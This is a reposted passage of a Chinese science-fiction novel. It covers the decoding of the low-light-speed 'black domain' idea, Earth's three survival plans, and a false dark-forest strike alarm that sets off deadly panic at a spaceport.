<p>这时，进入旋涡已经二十分钟，小艇已滑落下水墙总高度的三分之一，艇身的倾斜角度越来越大，但由于离心力的缘故，艇中的人们并没有滑到左舷。这时，他们的目力所及之处全是水墙，即使从对面也看不到远处的峰顶了。他们都不敢看天空，因为在旋涡中，小艇是与水墙一起转动，相对几乎静止，所以几乎感觉不到旋涡的旋转，小艇仿佛是紧贴在一个静止的海水盆地的边坡上；但如果看天，大旋涡的旋转立刻显现出来，布满云层的天空以越来越快的速度整体转动，让人头晕目眩。由于离心力的增加，船下的水墙表面更加致密平滑，固体感也更强，如结冰一般。大旋涡底部的吮洞传出的轰鸣声压住了一切，让大家再也不能对话。这时，太阳又从西方的云缝中露出来，把一束金光射进大旋涡，然而照不到底，只照亮了水墙的一小部分，使旋涡深处看上去更黑暗了。大量的水雾从涡底咆哮的吮洞中喷出，在阳光中形成一道彩虹，瑰丽地跨越旋转的深渊。</p>
<p>“记得爱伦·坡也描写过旋涡中的彩虹，好像还是在月光下出现的，他说那是连接今生与来世的桥！”杰森大声说，但没有人能听清他的话。直升机来救他们了，悬停在小艇上方两三米处，垂下一架悬梯让艇上的人爬上去。然后，空着的小艇漂远了，继续在旋涡中转着大圈，艇上没有吃完的鳕鱼上还燃着蓝幽幽的火苗。</p>
<p>直升机悬停在大旋涡的正上方，机上的人们看着下面旋转的大水坑，不一会儿就感到头晕恶心。于是有人给驾驶系统发出指令，让直升机以与旋涡相同的转速在空中旋转，这样在他们眼中，下面的旋涡确实静止下来了，但旋涡之外的整个世界却开始转动，天空、大海和山脉都在围绕着他们旋转，大旋涡仿佛成了世界的中心，眩晕感一点儿也没有减轻，AA哇地一下把刚吃进去的鱼都吐了出来。看着下面的大旋涡，程心脑海中出现了另一个旋涡，由一千亿颗恒星组成，发着银光在宇宙之海中旋转，两亿五千万年转一圈，那就是银河系；地球在其中连一粒灰尘都算不上，而默斯肯旋涡又只是地球上的一粒灰尘。</p>
<p>半个小时后，小艇旋落到涡底，瞬间被吮洞吞没了，在轰鸣声中可以隐约听到船体被折断绞碎时发出的咔嚓声。直升机把杰森送回了默斯肯岛，程心许诺尽快把赔他的船送来，然后与老人告别。直升机飞向奥斯陆，那里有最近的智子屏蔽室。</p>
<p>航程中，大家都在沉默地思考，甚至连目光的交流也没有。默斯肯大旋涡暗示着什么根本不用想，太明显了。</p>
<p>现在的问题是，降低光速与黑洞之间有什么关系？黑洞与宇宙安全声明又有什么关系？</p>
<p>2016-01-30</p>
<p>黑洞本身并不能改变光速，只是改变光的波长。</p>
<p>设想把光速降低到现有真空光速的十分之一、百分之一，甚至千分之一，分别是每秒三万千米、每秒三千千米和每秒三百千米，与黑洞有关系吗？一时看不出来。这里有一道坎儿，常规思维比较难以跨越，但也并不是太难。这些人毕竟属于人类中最有智慧的那一群，特别是曹彬，作为一位跨越三个世纪的物理学家，他善于极端思维，而且他还知道这样一个事实：早在公元世纪，就有一个研究小组在实验室中把介质中的光速降到每秒十七米，比快速骑行的自行车还慢。当然，这与降低真空中的光速在本质上是不同的，但至少使下面的设想不再显得那么疯狂了。</p>
<p>再降，把真空光速降至现在的万分之一，即每秒三十千米，与黑洞有关系吗？似乎与前面没有本质的区别，仍然看不出什么……不，等等！“十六点七！”曹彬脱口而出这个数字，他的双眼放射出光芒，很快把周围那些眼睛都点燃了。</p>
<p>每秒十六点七千米，太阳系的第三宇宙速度，如果达不到这个速度就不可能飞出太阳系。光也一样。</p>
<p>如果太阳系的真空光速降到每秒十六点七千米以下，光将无法逃脱太阳的引力，太阳系将变成一个黑洞。由于光速不可超越，如果光出不去就什么都出不去，没有任何东西可以飞出太阳系黑洞的视界，这个星系将与宇宙的其余部分彻底隔绝，变成一个绝对封闭的世界。</p>
<p>对于宇宙的其他部分来说，这样的世界绝对安全。低光速的太阳系黑洞从远处观察是什么样子，不得而知，但只能有两种可能：在落后的观察者眼中太阳系消失了；对于先进的观察者，低光速黑洞应该能被远程观察到，但观察者立刻就明白它是安全的。有一颗遥远的星星，那是夜空中一个隐约可见的光点，所有望了它一眼的人都说：那颗星星是安全的——这曾是一件被认为不可能的事，现在真的有可能做到。</p>
<p>这就是宇宙安全声明。饕餮海，他们想到了饕餮海，想到了被饕餮海永远封闭的无故事王国。其实，这个含义坐标并不需要，前面的解读已经很明确了。</p>
<p>后来，人们把低光速黑洞称为黑域，因为相对于原光速黑洞，低光速黑洞的史瓦西半径很大，内部不是时空奇点，而是一个广阔的区域。</p>
<p>2016-01-30</p>
<p>直升机飞行在云层之上，这时已经是夜里23点多，太阳正在西方缓慢地落下。这午夜的夕阳照进机舱，在金色的暖光中，大家都在想象，想象着光速每秒十六点七千米的世界的生活，想象着那个世界的夕阳每秒十六点七千米的光芒。</p>
<p>2016-01-30</p>
<p>至此，云天明情报的大部分拼图已经完成，只剩一块：针眼画师的画。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>二向箔</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-30</p>
<p>这个隐喻最终无法解读，如维纳斯的断臂一般。针眼的画成了一个永远的谜，这个情节构成了三个故事的基础，从它所显现出来的典雅的冷酷、精致的残忍和唯美的死亡来看，可能暗示着一个生死攸关的巨大秘密。</p>
<p>广播纪元8年，命运的抉择</p>
<p>2016-01-30</p>
<p>地球文明的三条生路</p>
<p>一、掩体计划成功希望最大的一个选择，完全基于人类现有的技术，没有理论上的未知。其实，掩体计划可以看做人类发展的自然延续，即使没有黑暗森林打击的威胁，人类也到了向太阳系大规模移民的时代，只是掩体计划更为集中，目的也更为明确。</p>
<p>这完全是地球世界自己的计划，云天明的情报中没有提到这个选择。二、黑域计划</p>
<p>通过把太阳系转化为低光速黑洞发布宇宙安全声明。这是所有选择中技术难度最高的，需要在半径达五十个天文单位（约七十五亿千米）的广阔空间里改变宇宙基本常数，被称为上帝工程，在理论上存在着巨大的未知。但黑域计划一旦成功，对地球文明所提供的安全保障是三个选择中最高的。除了宇宙安全声明所产生的保障外，进一步研究还发现，黑域本身就是一个高效防御屏障。来自外界的高速攻击体，如光粒，进入低光速区域后其速度立刻大大超越光速，而按照相对论原理，它只能以低光速运行，剩余的巨大动能则转化为巨大的质量，攻击体首先进入低光速区的部分质量急剧增大，速度则瞬间骤降，而仍在原光速区的后面部分将以原光速高速撞击到前部，这一效应将彻底摧毁攻击体。据计算，即使用强互作用力材料制造的像水滴那样的超坚固物体，在通过黑域边界时也将被完全粉碎。所以，人们把黑域称为宇宙保险柜。</p>
<p>黑域计划还有一个好处，在三个选择中，只有它能使人类免除太空中的颠沛流离，长久生活在熟悉的地球世界。但地球文明将为此付出巨大的代价，太阳系将与宇宙的其余部分完全隔绝，相当于人类把自己置身的宇宙直径从一百六十亿光年缩小至五十个天文单位。在光速为每秒16.7千米的世界里生活是什么样子现在还不得而知，但可以肯定的是，那个世界中的电子计算机和量子计算机只能以极低的速度运行，人类可能退回到低技术社会，这是比智子更强的技术锁死。所以，黑域安全声明除了自我隔绝外，还有技术自残的一面，这也就意味着人类将永远没有力量飞出自造的低光速陷阱了。</p>
<p>2016-01-30</p>
<p>三、光速飞船计划</p>
<p>曲率驱动技术在理论上未知，但实现难度明显低于黑域技术。光速飞船几乎无法为地球文明提供任何安全保障，这一技术只能用于星际逃亡。这是三个选择中未知因素最多的一个，即使实现，进入茫茫外太空的人类前途也凶险莫测。同时，由于逃亡主义的危险性，这一计划的实现在政治上充满障碍和陷阱。</p>
<p>但注定有一部分人迷恋光速飞船，原因在生存之外。对于广播纪元的人类，明智的做法是三个计划同时进行。</p>
<p>2016-01-30</p>
<p>公司总部占据了一整棵巨树，最大的特色是所有的建筑都是全透明的，且建筑材料的折射率与空气相近，内部结构全部显现出来，可以看到里面移动的人员和无数信息窗口，那一幢幢悬挂在空中的大楼像五光十色的透明蚁穴。</p>
<p>2016-01-30</p>
<p>一个新出现的窗口稳定在最前方，画面中出现的是AA的秘书，她从窗口中盯着程心和AA，一脸惊恐。</p>
<p>“不好啦！打击警报！”秘书喊道。“具体怎么回事？”AA问。</p>
<p>“太阳系预警系统的第一个观测单元不是刚启动吗？马上就发现了光粒！”“在什么方向什么距离？”</p>
<p>“我不知道，我什么都不知道，我只知道……”“是官方的警报吗？”程心冷静地问。</p>
<p>“哦，好像不是，但所有媒体都在疯传，肯定是真的！我们还是去发射港逃命吧！”秘书说完，就从窗口中消失了。程心和AA穿过密密麻麻的信息窗口来到会议厅的透明墙边，看到下方的城市中乱象已经出现。空中的飞行车突然增多，交通变得混乱，所有车辆都在拥挤中高速抢行。有一辆飞车撞到巨树建筑上，腾起一团火球，接着，城市中又有两处出现火焰和烟柱……</p>
<p>AA挑出几个信息窗口仔细察看，程心则联系IDC的委员，他们的电话大多占线。程心只联系上了两个委员，其中一位与他们一样不知情，另一位PDC的官员则告诉程心，可以确认太阳系预警系统的一号观测单元确实观测到了重大异常情况，但具体内容他也不知道。他还确认舰队国际和联合国都没有发出正式的黑暗森林打击警报，但他并不乐观。“官方没发警报有两种可能，一是真的没事，二是光粒已经太近，没必要再发了。”这位PDC官员说。</p>
<p>AA从信息窗口中只得到一条确定信息：光粒沿黄道面以光速袭来，至于方向和目前与太阳的距离说法各异，对击中太阳时间的说法更是差异极大，有的说还有一个月的时间，有的说只剩几个小时了。“我们去‘星环’号。”AA说。</p>
<p>“还来得及吗？”“星环”号是星环公司的一艘商务飞船，现在停泊在地球同步轨道的公司太空基地。如果警报为真，目前唯一的逃生希望是乘飞船飞向木星，当光粒击中太阳时在木星的背阳面躲过大爆发。现在正值四百天一遇的木星冲日，以行星际飞船的速度，从地球飞到木星约需二十五至三十天，正好是AA刚看到的对剩余时间最长的一种预估，但这个信息极不可靠，因为刚开始建设的太阳系预警系统不可能提供那么长的预警时间。</p>
<p>“那总得做点什么，不能在这里等死！”AA说着，拉起程心跑出了会议大厅。外面就是树顶的停车场，她们钻进了一辆飞行车。AA想起什么又下了车，几分钟后她回来了，拎着一个琴盒似的长条箱，她把箱子中的东西取出来，把箱子扔在车外。程心认识那东西，虽然它现在发射的是激光而不是子弹，那是一支步枪。“你拿这个干什么？”程心问。</p>
<p>“发射港一定挤破了头，谁知道会发生什么。”AA说着，把步枪扔到后座上，发动了飞行车。现在每座城市都有一个太空发射港，主要作为太空穿梭机的起飞场，就像古代的机场一样。</p>
<p>飞行车向着发射港方向飞去，汇入一条浩浩荡荡的空中车流。这飞蝗群一般的车辆都是飞向发射港的，车流在地面投下了一条流动的影子，仿佛是城市流淌而出的血液。在前方目的地的方向，出现了十几根直插蓝天的白线，那是太空穿梭机的尾迹，它们升上高空，然后都折向东方，消失在天空深处。新的白线还在不断从地面升起，向空中延长，每条白线的头部都有一个火团，光度看上去比太阳还亮，那是穿梭机聚变发动机的光焰。</p>
<p>程心从车内的信息窗口中看到一幅实时画面，是从太空中的近地轨道拍摄的。她看到无数条上升的白线在褐色的大陆上出现，不断延长，不断增多加密，仿佛地球正长出白发，白线头部的小火团像一大片浮向太空的萤火虫——这是人类从地球最大规模的一次集体逃离。到达发射港上空时，可以看到下面排列着一大片太空穿梭机，大约有一百多架，在远处的巨型机库中仍不断地有穿梭机被移出来。空天飞机早已淘汰，现在的太空穿梭机都是垂直起飞。与程心在太空电梯的终端站港口看到的形状各异的太空艇不同，穿梭机都是规则的流线型，带有三至四片尾翼，它们现在零乱地竖立在发射港的停泊区，像一片钢铁植物的丛林。</p>
<p>AA在车上已经通知机库，把星环公司的一架穿梭机移到停泊区。她很快从空中找到了那架穿梭机，驾驶飞行车降落到它旁边。程心看到周围停满了大小不一的穿梭机，小的只有几米高，看上去像一枚放大的炮弹，很难想象这样小的飞行器竟然能够飞出地球的引力深井进入太空。也有许多大型穿梭机，有的像古代大型民航客机那样大。星环公司的这架穿梭机属于中小型，高有十米左右，通体被金属镜面覆盖，让人想到水滴。穿梭机用带轮的起落架着地，可随时被勤务车拖向发射点。一阵轰鸣声从远处的发射区传来，很奇怪，竟让程心想起默斯肯大旋涡的声音。地面颤动起来，让她感到小腿发麻，一团强光自发射区亮起，一架尾部拖着光焰的穿梭机腾空而起，很快消失在高空，于是那伸向高空的尾迹又增加了一条。大团的白雾涌了过来，带着奇怪的焦味，这些雾气并非来自穿梭机的发动机，而是发射台下的冷却池中蒸发的冷却水。一切都笼罩在潮湿闷热的蒸汽中，让人更加焦躁不安。</p>
<p>在她们即将沿着一架细长的舷梯登上穿梭机之际，程心在渐渐消散的气雾中看到了一群孩子。他们就聚在不远处，看上去都是十岁以下的小学生，全穿着整洁漂亮的校服，有一位年轻女教师领着他们，她的长发被气浪吹起，正站在那里四下张望，一副茫然无助的样子。“能稍等等吗？”程心问。</p>
<p>AA看了看那群孩子，知道程心要干什么，“你去吧，我们要等发射位，队排得长着呢。”原则上太空穿梭机可以在任何平坦的场地起飞，但为了防止聚变发动机喷出的超高温等离子体对周围造成危险，都在发射台上起飞，发射台下有冷却池，还有导流槽，可以把等离子体导向安全的方向。</p>
<p>女教师看到程心走过去，没等她发问，就扑过来抓住她，“这架穿梭机是你们的吧？求求你救救孩子们吧！”她湿漉漉的刘海儿紧贴在前额上，眼泪和雾水一起在脸上流淌，她盯着程心，像要用眼神把她死死抓住似的。孩子们也围了过来，期盼的目光都汇聚到程心身上，“我们是太空夏令营的，本来就是要上同步轨道的，可是警报来了以后，他们不让我们登机了，让别人上去了！”“那架穿梭机呢？”一同走来的AA问。</p>
<p>“已经起飞了，求求你们……”“带他们一起走吧。”程心对AA说。</p>
<p>AA盯着程心看了几秒钟，那目光的含意很明确：地球上的人多了去了，你救得过来吗？最后，她在程心依然坚定的目光中摇摇头说：“只能带三个。”“可这架穿梭机能坐十几个人的！”</p>
<p>“但‘星环’号在最大加速状态下只能乘五个人，只有五个深海液舱位，多出来的人会被压成肉饼的。”这个回答让程心很意外，深海液只在具有超大加速功率的恒星际飞船中才使用，而她一直以为“星环”号是一艘行星际飞船。</p>
<p>“好的好的，那就带三个吧！”教师放开程心转而抓住AA，生怕失去这个机会。“你选三个吧。”AA指指孩子们说。女教师放开了AA，呆呆地看着她，仿佛陷入了比刚才更深的恐惧中，“让我选？！天啊，我怎么能……”她惶恐地四下张望着，不敢看身边的孩子们，她看上去很痛苦，好像孩子们的目光正把她烧焦似的。</p>
<p>“好吧，我来选。”AA说，然后转向孩子们，脸上露出笑容，“同学们听着，我出三道题，谁先答对我们就带谁走。”她不理会程心和女教师吃惊的目光，竖起一根手指，“第一题：有一盏灯，关着，一分钟时闪亮了一下，再过半分钟又闪亮一下，再过十五秒再闪亮一下，以后就这样每过前面间隔时间的一半就闪亮一下，请问到两分钟时灯闪亮了多少次？”“一百次！”有孩子脱口而出。</p>
<p>AA摇摇头，“不对。”“一千次！”</p>
<p>“不对，好好想想。”一阵沉默后，响起了一个怯生生的声音，来自一个文静的小女孩儿，在嘈杂的噪声中几乎听不清：“无数次。”</p>
<p>“你，过来。”AA指着那个女孩儿说，待她走过来后把她揽到身后，“第二道题：一根粗细不均匀的绳子，从一头点燃后烧完要用一个小时，如何用它来做15分钟的计时？注意，不均匀！”这次没有孩子急着说，他们都在思索，但很快有一个男孩儿举起了手，“绳子对折后从两头烧！”</p>
<p>AA点了点头，“你过来吧。”她把这个男孩儿也拉到身后，与先前答对题的那个女孩儿站在一起，“第三题：82、50、26，下一个数是什么？”很长时间没人回答。</p>
<p>AA重复道：“82、50、26，下一个数？”“10！”一个女孩儿喊道。</p>
<p>AA冲她竖起大拇指，“好孩子，过来吧。”然后，她对程心示意了一下，带着三个孩子头也不回地走向穿梭机。程心跟着他们走到舷梯下，回头看了一眼，只见剩下的孩子们围在他们老师的身边看着她，像看着正在最后一次落下永远不再升起的太阳。这景象在泪水中模糊了，攀上舷梯时，她仍能感受到背后孩子们那绝望的目光，如万箭穿心。这种感觉她在作为执剑人的最后时刻曾有过，在澳大利亚听到智子宣布人类灭绝计划时也曾有过，这是比死亡更痛苦的剧痛。</p>
<p>穿梭机内部很宽敞，有两排十八个座位，但机舱是竖立的，像井一样，需要沿阶梯爬到座位上。同在太空艇内的感觉一样，程心觉得这架飞行器简直就是一个空壳，她不知道哪儿还有空间安装发动机和控制系统。她想到公元世纪的化学动力火箭，如摩天大楼般高高耸立着，却只有顶端那一点点有效荷载。穿梭机舱内几乎看不到驾驶设备，只有几个信息窗口飘浮着。穿梭机的A.I.似乎认识AA，她一进来，那几个窗口就围拢到她身边，当她帮助孩子们和程心系安全带时，那些窗口一直跟着她。“别这样看我，我给了他们机会，要生存就得竞争。”AA低声对程心说。</p>
<p>“阿姨，他们在下面会死吗？”那个男孩子问。“我们每个人一生下来都注定要死的，只是早晚而已。”AA说着，坐到程心旁边的座位上，她没系安全带，只是察看着那些窗口，“见鬼，我们的发射位前还排着二十九个！”发射港共有八个发射台，每次发射后，发射台都需要冷却十分钟才能再次使用，这期间还需向冷却池中加注冷却水。</p>
<p>仅从逃生角度看，等待的这段时间并不太重要，因为飞到木星需要一个月，如果这之前打击降临，无论是在太空中还是在地球上，结局都一样。但现在的问题是：稍有耽搁，可能就永远也无法起飞了。这时，社会已处于混乱中，在求生本能的驱使下，城市中的一千多万人都在拥向发射港。这个时代的太空穿梭机相当于公元世纪的飞机，在短时间内只能运载一小部分人；而拥有穿梭机就如同古代拥有飞机一样，对大部分人来说是可望而不可即的。现在就算加上太空电梯的运力，在一个星期内只能把不到百分之一的地面人口送入近地轨道，能最后踏上木星航程的人还不到千分之一。</p>
<p>穿梭机上没有舷窗，但有几个信息窗口从各个角度播放着外面的图像，可以看到黑压压的人群正在拥进停泊区。人们围在每一架太空穿梭机周围，挥着拳头声嘶力竭地叫喊着，希望能够挤上其中一架。与此同时，在发射港的外围地带，早些时候降落的一大片飞行车又相继起飞，车内都是空的，是车的主人遥控它们飞上天阻止穿梭机发射的。天空中的飞行车越来越多，悬停在发射台上空，形成一片黑色的屏障，这样下去，很快谁都走不成了。程心缩小了这个信息窗口，转身去安慰后座上的三个孩子。就在这时，AA惊叫了一声：“天啊！”程心回头看时，见那个画面被放到了最大，几乎占据了舱内的全部视野，画面上，一团耀眼的火球出现在穿梭机的丛林中。</p>
<p>有人竟然在停泊区的人群中启动发射了！核聚变发动机喷出的等离子体的温度，是古代化学发动机喷出物温度的几十倍，如果在平坦的地面发射，高温等离子体能瞬间熔化地表，并向四周迸射，半径三十米内无人能存活。从画面中可以看到，许多黑点从烈焰出现的地方飞出，其中一个碰到附近一架穿梭机的顶部，在那里留下了一道黑印，那是一块烧焦的人体。火团周围的几架穿梭机倒下了，可能是起落架被烧熔了。</p>
<p>人群瞬间寂静下来，人们抬头看着，那架可能烧死了几十人的穿梭机轰鸣着从停泊区升起，拖着白色的尾迹直上高空，然后转向东方。人们似乎不敢相信眼前发生的事。只过了十几秒钟，又一架穿梭机从停泊区起飞，这次距离他们更近，轰鸣、火光和热浪让人群由僵滞陷入极度的狂乱中。接下来，第三架，第四架……停泊区的穿梭机相继强行发射，团团烈焰中，焦黑的人体拖着烟火在空中横飞，停泊区变成了火葬场！AA咬着下唇看着惨烈的画面，然后一挥手关上了这个窗口，埋头在另一个小窗口上点击操作起来。</p>
<p>“你干什么？”程心问。“起飞。”</p>
<p>“停下。”“你看看——”AA把另一个小窗口甩给程心，其中显示着周围几架穿梭机——在每架穿梭机的尾部发动机喷口上方，都有一圈散热环，由大量的小散热片组成，用于聚变堆的散热。程心看到，周围几架穿梭机的散热环都发出暗红色的光芒，表示它们的聚变堆已经启动，即将起飞。“与其让他们先飞，还不如我们飞！”AA说。如果这些穿梭机中有一架启动发动机，就有可能烧熔周围穿梭机的起落架，使它们倾倒在已经熔化的地面上，包括星环公司的这架。</p>
<p>“不行，停下。”程心的声音平静，但无比坚定，她经历过比这更大的灾难，这一次她能够从容面对。“为什么？”AA的声音变得同样平静。“因为下面有人群。”</p>
<p>AA停下操作，转身面对程心，“那样，过不久，我们、人群和地球就要一起变成碎片，在这些碎片中，你能分清哪些是高尚的，哪些是卑鄙的？”“至少现在，道德底线还在。我是星环公司的总裁，这架穿梭机的所有权是星环公司的，你也是公司的员工，我有权做这个决定。”</p>
<p>AA与程心对视良久，然后点点头，伸手关闭了操作窗口，接着又关上了所有的信息窗口，把这里与外面狂躁的世界隔绝了。“谢谢。”程心说。AA没有回答她，像突然想起什么似的跳起来，从一排空着的座椅上拿起那支激光步枪，离开座位沿梯子向下走去，同时说：“你们都系好安全带，这里随时可能倒下去。”</p>
<p>“你去干什么？”程心问。“我们走不了，他们也他妈的别想走！”AA挥着步枪喊道。</p>
<p>AA打开舱门走出去，立刻把舱门紧紧关上以防人们进入，然后从舷梯下到地面，端起步枪对着最近的一架正在启动的穿梭机尾翼射击。尾翼被击中的地方冒起一股青烟，被穿出一个小洞。洞只有手指粗，但已经足够了，穿梭机的监测系统会检测到尾翼的缺陷，A.I.系统将拒绝执行发射程序，这种拒绝是超越最高系统权限的，穿梭机里面的人不可能解除它。果然，那架穿梭机的散热环暗了下来，标志着聚变堆停机了。AA转着圈连续开枪，把周围的八架穿梭机每一架的尾翼上都穿了一个洞。在滚滚热浪和烟尘中的人群一片混乱，甚至没人注意到她干了什么。有一架散热环暗下来的穿梭机的舱门开了，走下来一个衣着华丽的女人，她围着穿梭机底部察看，很快发现了尾翼上的小洞，歇斯底里地哭叫起来，接着在地上打滚，把头向起落架上撞。没有人理会她，人们只看到她忘记关上的舱门，一拥而上拼命地想挤进那架已经不能起飞的穿梭机，很快挤成一大堆。AA走上“星环”号的舷梯，把刚探出头来的程心推了回去，自己也跟进去，然后飞快地关上舱门。进来后，AA立刻呕吐起来。“外面……到处都是烤肉味儿。”AA在呕吐平缓下来后说。</p>
<p>“我们会死吗？”一个女孩儿从上面的座椅里探出头问。“我们会看到非常非常壮观的宇宙景象。”AA一脸神秘地对她说。</p>
<p>“是什么样子？”“反正，是最最壮观的，太阳将变成一团大焰火！”</p>
<p>“然后呢？”“然后……也没什么，什么都没了能有什么，是吧？”AA走上去依次拍拍三个孩子的头说，她不打算哄骗他们，他们既然能答出那样的问题，就不会缺少看清眼前现实的智力。当两人再次紧挨着坐下后，程心把一只手放到AA的手上，轻轻说道：“AA，对不起。”</p>
<p>AA对程心笑笑，这笑容程心很熟悉，AA在她眼中一直是一个小女孩儿，但却是一个强有力的小女孩儿，她在AA面前既感觉成熟，又感到无力。“别放在心上，反正都是瞎忙活，最后结果都一样，像这样省点儿心也好。”AA长出一口气说。</p>
<p>如果“星环”号真的是恒星际飞船，那它飞到木星就要快得多，虽然地球至木星间的距离还不足以让它充分加速，但航程也只需两周左右。AA似乎看出了程心的想法，“即使太阳系预警系统完全建成，预警时间也不过一天而已……不过冷静下来细想想，我感觉警报可能是假的。”</p>
<p>程心不知道，AA是不是因为这个想法，刚才才那么轻易对她屈服的。AA的话很快得到了证实。程心收到了那个IDC委员、同时也是PDC官员的电话，告诉她舰队国际和联合国已经联合发表声明，警报纯属误传，目前没有发现任何黑暗森林打击的迹象。AA点开了几个信息窗口，大部分都在播放联合国和舰队发言人发布声明的画面。再看看外面，发射区和停泊区的穿梭机发射都停止了，混乱还在继续，但不会再恶化了。</p>
<p>等外面稍稍平静一些，程心和AA走出穿梭机，看到的景象如惨烈的战场。到处是烧焦的尸体，都呈炭黑色，有的仍在冒出火苗。穿梭机群东倒西歪，有的倒在地上，有的相互斜靠在一起。前后共有九架穿梭机从停泊区强行发射，现在它们在天空中的尾迹还十分清晰，像划开的伤口一般。人群已不再狂躁，人们有的坐在发热的地上，有的呆立着，有的漫无目的地走动，似乎都搞不清眼前的一切究竟是噩梦还是现实。有警察部队在维持秩序，救护工作也开始了。“下一次警报可能就是真的了。”AA对程心说，“你跟我们到木星背面去吧，星环公司要在那里建掩体工程的太空城。”</p>
<p>程心没有回答AA，而是问道：“‘星环’号是怎么回事？”“这不是原来的‘星环’号，是新建的一艘小型恒星际飞船，行星航行状态时可乘二十人，恒星状态时乘五人，这是董事会特别为你建造的，可以作为你在木星的办公地点。”</p>
<p>行星际飞船与恒星际飞船的差别，就像内河渡船与大洋上的万吨巨轮的差别一样，当然区别并不是体现在体积上，恒星际飞船也有体积很小的，但与行星际飞船相比，它们拥有最精良的推进系统，装备着行星际飞船上没有的生态循环系统，且每个分系统都有三到四个冗余备份。如果程心真的乘新的“星环”号到木星背阳面，不管发生什么情况，飞船都足以维持她一生的生存。程心摇摇头，“你们去木星吧，你乘‘星环’号去，我不参与公司的具体事务，待在地球上就可以。”</p>
<p>“你只是不想成为少数能活下来的人。”“我与几十亿人在一起，不管发生什么事情，如果同时发生在几十亿人身上，那就不再可怕。”</p>
<p>“我很担心你。”AA抱住程心的双肩关切地端详着她，“不是担心你同几十亿人一起死去，我是怕你遇到比死更可怕的事。”“我已经遇到过了。”</p>
<p>“如果向着光速飞船的理想走下去，你肯定还会遇到的，可你还能经受得起吗？”假警报事件是大移民以来最大的社会动乱，虽然很短暂，造成的损失也十分有限，但给人们留下的印象却铭心刻骨。</p>
<p>在世界各地的上千个太空发射港中，大部分都发生了穿梭机从人群中强行发射的罪行，有一万多人死于核发动机的烈焰。在太空电梯的基站也发生了武装冲突，与发射港骚乱不同，这种冲突是国家间的，部分国家试图派军队控制赤道海洋上的国际基站，只是由于假警报的及时解除才没有升级成战争。在地球的太空轨道上，甚至在火星，都发生了民众群体争夺飞船的事件。除了那些为自己逃命不顾众人死活的败类，在假警报事件中还发现了一件同样让公众深恶痛绝的事：在地球同步轨道和月球背面，有几十艘小型的恒星际和准恒星际飞船正在秘密建造中。所谓的准恒星际飞船，是指拥有恒星际飞船的生态循环系统，但只装备行星际推进系统的太空飞行器。这些建造中的昂贵飞船有些属于大公司，有些属于超级富豪。这些飞船都很小，恒星际状态下，也就是在完全依赖生态循环系统长期生存的状态下，大多只能容纳几个人。它们的目的只有一个：长期躲在巨行星背面。</p>
<p>正在建设的太阳系预警系统只能提供约二十四小时的预警时间，如果黑暗森林打击真的到来，这点时间内，现有的任何宇宙飞行器都不可能把人从地球送到最近的掩蔽处——木星，地球其实是孤悬于死亡之海上。这是一个人们早就看清了的事实，假警报过程中的争相逃命，不过是被压倒一切的求生欲望所驱使的集体疯狂，其实没有意义。目前长期生活在木星的有五万多人，大多是舰队木星基地的太空军军人，也有一部分掩体工程前期准备的工作人员，他们有充足的理由待在那里，公众无话可说。但那些秘密建造的恒星际飞船一旦完工，它们那些暴富的拥有者就可以长期躲在木星的背阳面了。从法律角度讲，至少在目前，没有国际法或国家法律禁止团体或个人建造恒星际飞船，在巨行星背阳面避难也不被看做是逃亡主义，但这里出现了一个人类历史上最大的不平等：在死亡面前的不平等。</p>
<p>在历史上，社会不平等主要出现在经济和社会地位领域，所有人在死亡面前基本上是平等的。当然，死亡上的不平等也一直存在，比如医疗条件的不均、因贫富差距造成的在自然灾害中不同的生存率、战争中军队与平民的生存差异等等，但还从来没有出现过这样的局面：占人类总数不到万分之一的少数人能够躲到安全之处生存下来，而剩下的几十亿人在地球上等死。即使在古代，这种巨大的不平等都无法被容忍，更不用说在现代社会了。</p>
<p>这种现象直接导致了国际社会对光速飞船计划的质疑。</p>
<p>2016-01-30</p>
<p>太空前哨——太阳系预警系统</p>
<p>对于光粒，地球世界只在187J3X1恒星和三体星系被摧毁时观察到两次，对它的了解很少，只知道它的运行速度极为接近光速，对于它的体积、初始质量和接近光速时的相对论质量则一无所知。但光粒确实可以称得上是攻击恒星的最原始武器，仅凭其巨大的相对论质量产生的动能摧毁目标。如果具备了将物体加速到光速的技术，只需发射极小质量的“子弹”即可产生巨大的摧毁能力，确实很“经济”。有关光粒的最宝贵的观测数据是在三体星系毁灭前取得的，科学家们发现了一个重要现象：由于光粒极高的速度，在与星际空间的稀薄原子和尘埃的剧烈碰撞中，会发出包括从可见光到伽马射线的强烈辐射，这种辐射有明显的特征。由于光粒的体积极小，所以直接观察完全不可能，而这种辐射却能够被观测到。</p>
<p>2016-01-30</p>
<p>初看光粒攻击是无法预警的，因为它的运行速度几乎是光速，与它自己产生的辐射几乎并行前进，同时到达目标——换句话说，观测者在事件光锥之外——但真实的情况却更复杂一些。由于有静止质量的物体不可能完全达到光速，光粒的速度虽极为接近光速，但与精确的光速还是有一个微小的差值，这个差值使得光粒发出的辐射比光粒本身要稍快一些，如果光粒的飞行距离足够长，这个差值将越来越大。另外，光粒攻击目标的弹道并非绝对直线，由于其巨大的质量，不可避免地受附近天体引力的影响，弹道会发生轻微的弯曲，而这种弯曲比纯光线在相同引力场中弯曲的曲率要大得多，在接近目标时需要进行修正，这就使得光粒所走的路程比它发出的辐射要长一些。</p>
<p>2016-01-30</p>
<p>一号观测单元其实就是危机纪元末的林格-斐兹罗观测站，七十多年前，正是这个观测站首先发现了驶向太阳系的强互作用力探测器——水滴。现在，观测站仍位于小行星带外侧的太空中，只是设备都进行了更新。比如可见光观测部分，望远镜的镜片面积又增大了许多，第一个镜片的直径由一千二百米增至两千米，上面可以放下一个小城镇了。这些巨型镜片的制造材料直接取自小行星带。最初制造的是透镜组中一片中等的镜片，直径五百米，它造出后被临时用来把太阳光聚焦到小行星上，熔化岩石制造高纯度玻璃，继而造出了其他的镜片。各个镜片成一排悬浮在太空中，透镜组延绵二十五千米，镜片间相距很远，看上去都像是孤立而互不相关的东西。观测站位于透镜组的末端，是一个仅容纳两人的小型空间站。</p>
<p>2016-01-30</p>
<p>观测站中的常驻人员仍然是军人与学者的组合，前者负责预警观测，后者从事天文学和宇宙学研究，因此，三个世纪前开始的林格博士和斐兹罗将军之间因为观测时间而发生的争执也延续了下来。</p>
<p>2016-01-30</p>
